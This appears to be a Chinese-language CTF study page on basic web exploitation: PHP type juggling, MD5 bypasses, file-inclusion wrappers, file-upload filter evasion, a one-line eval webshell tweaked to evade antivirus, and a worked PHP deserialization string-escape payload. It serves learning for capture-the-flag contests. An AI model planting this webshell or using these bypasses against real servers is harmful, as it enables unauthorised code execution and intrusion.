<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Web Basic Requirement | KYRIOTA</title>
  <meta name="author" content="KYRIOTA">
  
  <meta name="description" content="系统性收录解决Web题目需要的前置知识，过于零碎的知识未整合">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Web Basic Requirement"/>
  <meta property="og:site_name" content="KYRIOTA"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/kyriota.github.io/favicon.ico" rel="icon">
  
  
  <link rel="stylesheet" href="/kyriota.github.io/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/kyriota.github.io/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/kyriota.github.io/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/kyriota.github.io/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/kyriota.github.io/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/kyriota.github.io/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/kyriota.github.io/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-70812759-1', 'auto');
  ga('send', 'pageview');
</script>



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/kyriota.github.io/atom.xml" title="KYRIOTA" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/kyriota.github.io/">KYRIOTA</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/kyriota.github.io/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/kyriota.github.io/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/kyriota.github.io/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/kyriota.github.io/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/kyriota.github.io/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Web Basic Requirement</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>系统性收录解决Web题目需要的前置知识，过于零碎的知识未整合</p>
<span id="more"></span>

<hr>
<h1 id="PHP-amp-HTTP"><a href="#PHP-amp-HTTP" class="headerlink" title="PHP&amp;HTTP"></a><big><center>PHP&amp;HTTP</center></big></h1><p align="right"><small>PHP is the best language in the world</small></p>

<h2 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie,session,token"></a><big>cookie,session,token</big></h2><p>这三个东西的最基本的目的都是区分用户，标识身份，形式不同而已</p>
<ul>
<li><p>cookie：小饼干，按F12就可以找到当前页面存放的cookie，本地缓存，由服务器生成，在下次请求时又发回服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用，同时不会占据太多磁盘空间，所以每个域的cookie数量是有限的。由于cookie是人为设置的，所以cookie中可能藏有题目的hint</p>
</li>
<li><p>session：会话，服务端临时缓存用户的数据，用户离开网站后立即销毁，python requests中就有保留会话的方法</p>
</li>
</ul>
<p><img src="/images/session.jpg"></p>
<ul>
<li>token：因为当用户更换访问的服务器时，若session没有同步到位，则用户又需要重新登陆，token 就解决了这个问题。它将状态保存在客户端，并且借助加密算法进行验证保证安全性</li>
</ul>
<p><img src="/images/token.jpg"></p>
<h2 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a><big>HEADER</big></h2><p>响应头，是服务器以HTTP协议传HTML资料到浏览器前所送出的字串，便于提前判断是否接受请求以及请求的大致信息与属性，按F12就可以查看当前页面的HEADER，HEADER可以自定义，可能包含了题目的hint</p>
<p>其中有几个重要的HEADER需要了解</p>
<ul>
<li><code>X-Forwarded-for</code>：XFF头，含HTTP请求端的IP，但当仅使用这一响应头来验证请求段的真实IP时是不可靠的</li>
<li><code>Referer</code>：告诉服务器请求来自哪个链接</li>
<li><code>Content-type</code>：内容类型，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件，文件上传漏洞中常通过更改此 header伪造文件类型标识，请求头部中的Content-type可用大小写绕过，如Content-Type: multipart/form-data;曾在一个题目中将 multipart中的部分字母改为大写即可上传文件；而请求数据中的Content-type则直接复制粘贴即可，不同的后缀名均有对应的描述。例如下图中截包后修改Content-type头，并利用PHP不仅可以解析.PHP文件，包括.PHP2~.PHP5后缀的文件PHP都可以解析，来绕过对.PHP后缀的过滤，并成功上传</li>
</ul>
<img src="/images/WebshellUpload.png" style="zoom: 67%;" />

<h2 id="PHP标签写法"><a href="#PHP标签写法" class="headerlink" title="PHP标签写法"></a><big>PHP标签写法</big></h2><p>​    有时常见的 php标签会被过滤掉，这就需要尝试更换其他标签来进行尝试</p>
<p>​    &lt;?php echo ‘hi’; ?&gt;  标准写法</p>
<p>​    &lt;script language=”php”&gt; echo 1; &lt;/script&gt;  长标签写法，在 php7.0后就不解析了</p>
<h2 id="松散比较"><a href="#松散比较" class="headerlink" title="松散比较"></a><big>松散比较</big></h2><p>PHP中的比较分为弱比较（==，!=）与强比较（===，!==）两种方式，因为PHP中的变量不用声明其数据类型，导致了在弱比较中的适应性变化</p>
<img src="/images/PHP弱比较表.png" style="zoom: 50%;" />

<p>需要补充的是数字与字符串的弱比较，在进行这类比较时，会先尝试将字符串转为数字，转换规则为：若为非数字开头，则转换为<code>0</code>，若为数字开头，则转换为开头的数字，以下为示例：</p>
<center><code>"abd"---0</code></center>

<center><code>"123abc"---123</code></center>

<center><code>"123.456abc"---123.456</code></center>

<center><code>"123e4abc"---123e4</code></center>

<center><code>"233a233"---233</code></center>

<p>这样的比较，尤其是字符串转数字时科学计数法的识别，为md5的绕过埋下伏笔</p>
<p>而强比较会先判断数据类型是否一致，在若一致才进行对值的判断，否则直接返回false</p>
<h2 id="MD5碰撞与绕过"><a href="#MD5碰撞与绕过" class="headerlink" title="MD5碰撞与绕过"></a><big>MD5碰撞与绕过</big></h2><p>MD5码由<code>32</code>个字母或数字组成，因其碰撞概率相对较大，现已是一种不太可靠的Hash算法。针对PHP中的弱比较，强比较，以及md5()函数的特性，有几种常用的绕过方式。</p>
<ul>
<li><p>MD5弱比较：0e开头会被识别为科学计数法，<code>md5(aabg7XSs)</code>与 <code>md5(QNKCDZO)</code>的返回值均为 0e开头</p>
</li>
<li><p>MD5与SHA1数组绕过：MD5()与SHA1()都不能处理数组，相当于返回了NULL，虽然会产生WARNING，但它会继续执行啊，于是就这么绕过了，甚至骗过强等于。至于传参，写成：a[]=233&amp;b[]=Oops即可</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">233</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&quot;Oops&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$a</span>)===md5(<span class="variable">$b</span>))</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;it s ok&#x27;</span>;</span><br></pre></td></tr></table></figure>
  <blockquote>[Out]<br>it s ok</blockquote></li>
</ul>
<ul>
<li><p>MD5碰撞：最经典的是这两串16进制字符串</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexString1</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;</span>;</span><br><span class="line"><span class="variable">$hexString2</span>=<span class="string">&quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;</span>;</span><br><span class="line"></span><br><span class="line">hex2bin(<span class="variable">$hexString1</span>)===hex2bin(<span class="variable">$hexString2</span>);<span class="comment">//False</span></span><br><span class="line">md5(hex2bin(<span class="variable">$hexString1</span>))===md5(hex2bin(<span class="variable">$hexString2</span>));<span class="comment">//True</span></span><br><span class="line"><span class="comment">//都是008ee33a9d58b51cfeb425b0959121c9</span></span><br><span class="line"><span class="comment">//hex2bin()，十六进制字符串转二进制字符串，要求php version&gt;=5.4</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a><big>超全局变量</big></h2><p>之所以叫做超全局变量，是因为它们在一个脚本的全部作用域中都可用，常见的超全局变量有：</p>
<center><code>$_GET,$_POST,$_REQUEST,$GLOBALS等</code></center>

<ul>
<li><p>GET传参方式为在url后加 <code>/?var_name=value</code>，注意需要url编码</p>
</li>
<li><p>POST传参方式为页面内提交表单或用curl，python requests，hackbar等工具，通常不用进行url编码再传输，取决于HTTP HEADER中的”Content-Type“，若为“multipart/form-data”则不需要，若为“application/x-www-form-urlencoded”则需要</p>
</li>
<li><p>REQUEST的传参方式包括GET和POST</p>
</li>
<li><p>$GLOBALS[index] 作为数组，存储了所有全局变量，变量的名字就是数组的index，包括之前说到的$_GET，$_POST，以及 {定义在当前页面内，在函数外，非类成员} 的变量。对于类中的成员变量，类中函数必须使用$this-&gt;的方式访问，不能用$GLOBALS方式</p>
<p>  <img src="/images/%E5%89%8D%E7%AB%AF%E8%87%B3%E5%90%8E%E7%AB%AF%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B.png"></p>
</li>
</ul>
<h2 id="正则表达-regex"><a href="#正则表达-regex" class="headerlink" title="正则表达-regex"></a><big><a target="_blank" rel="noopener" href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md">正则表达-regex</a></big></h2><p>​    <em>基本的正则表达参考链接，在 PHP中存在非常规的正则表达标识，如下表</em></p>
<table>
<thead>
<tr>
<th>字符</th>
<th>匹配项目</th>
</tr>
</thead>
<tbody><tr>
<td>[:alnum:]</td>
<td>匹配任何字母和数字</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>匹配任何字母</td>
</tr>
<tr>
<td>[:blank:]</td>
<td>匹配blank, tab等空格符</td>
</tr>
<tr>
<td>[:punct:]</td>
<td>匹配任何标点符号 ‘! “ # $ % &amp; ‘ ( ) * + , - . / : ; &lt; = &gt; ? @ [ \ ] ^ _ ‘ { | } ~’.</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>匹配任何数字</td>
</tr>
<tr>
<td>[:graph:]</td>
<td>Graphical characters: ‘[:alnum:]’ and ‘[:punct:]’.</td>
</tr>
<tr>
<td>[:lower:]</td>
<td>匹配任何小写字母</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>匹配任何大写字母</td>
</tr>
<tr>
<td>[:print:]</td>
<td>Printable characters: ‘[:alnum:]’, ‘[:punct:]’, and space.</td>
</tr>
</tbody></table>
<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><big>一句话木马</big></h2><center><code>&lt;?php @eval($_P0ST['key']) ?&gt;</code></center>

<p><del>因为直接写上去会被报毒，手动把数字0改为字母O就行</del></p>
<p>原理在于：当有写入了这样代码的文件能够被服务器解析，且解析文件的页面可以访问，我们就可以向该页面POST一个key，其值设为任意希望服务器执行的PHP代码然后被eval执行；基于此，菜刀，蚁剑等 Webshell工具可以连接服务器后台</p>
<h2 id="swp备份文件"><a href="#swp备份文件" class="headerlink" title=".swp备份文件"></a><big>.swp备份文件</big></h2><p>Linux中 Vim编辑器产生的临时文件，用于备份被编辑的内容以防非正常退出</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim -r original_file_name.file_type.swp	#终端输入此命令可以查看文件</span><br><span class="line">:w file_name.file_type	#Vim中输入此命令可以保存文件到终端运行目录</span><br></pre></td></tr></table></figure>

<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a><big>文件包含漏洞</big></h2><p align="right"><small>特征：xxx.php/?file=xxx</small></p>

<p>include()函数：检索文件中的php代码，若存在，则执行；反之则输出原文。原本用于优化代码的重用性，但其特性使得这个函数就是造成漏洞的根本</p>
<ul>
<li>php伪协议（封装协议）：<ul>
<li>php://：可以访问各种I/O流，如php://input常用于file_get_contents(php://input)，这样就可以读入用户的输入流。如果直接使用<code>?file=wanted.php</code>会被解析，但想要查看源码，则可以用<code>?file=php://filter/convert.base64-encode/resource=wanted.php</code>，可以得到其b64编码后的源码，这样php://filter就作为中间流，把源码转b64，include()无法执行，于是直接输出b64编码后的源码</li>
<li>file://：可以访问本地文件，后接目录即可</li>
<li>还有如zip://，data://等协议，但目前没有做到有需要的题目</li>
</ul>
</li>
<li>文件上传+文件包含：当用户可以上传文件且文件目录可知，同时还存在文件包含，则用户可以通过上传任意包含了一句话木马的文件扔给include()来解析</li>
</ul>
<h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a><big>反序列化逃逸</big></h2><p>用户输入要传输到服务器，常需要过滤与序列化，但当过滤步骤放在序列化之后，则可能因为字符串逃逸而造成对象注入</p>
<ul>
<li><p>原理：过滤函数造成了序列化返回的字符串内容减少或增加的现象，但没有修改数据长度的标记（如 “php”被替换为 “NONONO”；或 “WHERE”被替换为 “MARK”），又反序列化通过识别 “;}“闭合，后面冗余的内容会被丢弃</p>
</li>
<li><p>具体的攻击形式</p>
<ul>
<li><p>在此可以先确认需要构造的对象</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User(<span class="string">&#x27;guest&#x27;</span>,<span class="keyword">new</span> Admin(<span class="string">&#x27;hack&#x27;</span>)));</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>#[Out] // 原本无换行符与任何空格，为了可读性而手动添加<br>O:4:"User":2:{<br>&emsp;s:8:"username";s:5:"guest";<br>&emsp;s:6:"passwd";O:5:"Admin":1:{<br>&emsp;&emsp;s:3:"Key";s:4:"hack";<br>&emsp;}<br>}</blockquote>
  </li>
<li><p>确定了需要构造的对象即为上文中的输出</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此处用户只能控制User类中的$username与$passwd</span></span><br><span class="line"><span class="comment">#却可以通过逃逸修改Admin类中的$Key</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Key</span>=<span class="string">&quot;onlyAdminKnow&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Key=<span class="variable">$Key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;Key,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterLess</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;NO&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#减少2个字符</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterMore</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span>=str_replace(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;_JESUS_&#x27;</span>,<span class="variable">$s</span>);<span class="comment">#增加3个字符</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># BASIC:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iusername</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$ipasswd</span>=<span class="string">&#x27;guestpass&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$iusername</span>,<span class="variable">$ipasswd</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:6:&quot;passwd&quot;;s:9:&quot;guestpass&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">HACK:</span>↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#这就是希望注入的内容，修改Admin类中的$Key为hack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LESS:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======LESS START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#思想在于：标记长度不变的情况下数据减少了</span></span><br><span class="line">    <span class="comment">#也就是说会有与减少量相等的字符数量被吞并为变量的value</span></span><br><span class="line">    <span class="variable">$dataEatenByLess</span>=<span class="string">&#x27;&quot;;s:6:&quot;passwd&quot;;s:41:&quot;&#x27;</span>;</span><br><span class="line">    <span class="comment">#希望被filterLess吃掉的字符串如上</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$dataEatenByLess</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//21</span></span><br><span class="line">    <span class="comment">#每个FLAG吞2字符，在passwd补一位凑3的倍数</span></span><br><span class="line">    <span class="comment">#11个FLAG吞完，吞完后要改什么变量就随心所欲了</span></span><br><span class="line">    <span class="variable">$payloadPasswd</span>=<span class="string">&#x27;0&#x27;</span>.<span class="variable">$target</span>;</span><br><span class="line">    <span class="variable">$payloadLess</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">11</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$payloadLess</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$payloadLess</span>,<span class="variable">$payloadPasswd</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    unserialize(filterLess(<span class="variable">$data</span>));<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:44:&quot;NONONONONONONONONONONO&quot;;s:6:&quot;passwd&quot;;s:54:&quot;0&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MORE:↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;======MORE START======&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#思想在于：标记长度不变的情况下数据增加了</span></span><br><span class="line">    <span class="comment">#计算好需要逃逸的量，使其刚好与增加量相等，这些字符就跑到变量的value之外了</span></span><br><span class="line">    <span class="keyword">echo</span> strlen(<span class="variable">$target</span>),<span class="string">&quot;\n&quot;</span>;<span class="comment">//53</span></span><br><span class="line">    <span class="comment">#每个FLAG溢出3个字符，需要逃逸53个字符</span></span><br><span class="line">    <span class="comment">#在逃逸字符闭合后面加上任意一个字符凑成3的倍数，18个FLAG达到溢出量</span></span><br><span class="line">    <span class="variable">$dataOverflow</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">18</span>;<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$dataOverflow</span>.=<span class="string">&#x27;FLAG&#x27;</span>;</span><br><span class="line">    <span class="variable">$dataOverflow</span>.=<span class="variable">$target</span>.<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span>=serialize(<span class="keyword">new</span> User(<span class="variable">$dataOverflow</span>,<span class="string">&#x27;anything&#x27;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>,<span class="string">&quot;\n&quot;</span>;<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:126:&quot;FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    unserialize(filterMore(<span class="variable">$data</span>));<span class="comment">//&#123;s:8:&quot;username&quot;;s:126:&quot;_JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS__JESUS_&quot;;s:6:&quot;passwd&quot;;O:5:&quot;Admin&quot;:1:&#123;s:3:&quot;Key&quot;;s:4:&quot;hack&quot;;&#125;&#125;0&quot;;s:6:&quot;passwd&quot;;s:8:&quot;anything&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//hack</span></span><br></pre></td></tr></table></figure></li>
</ul>
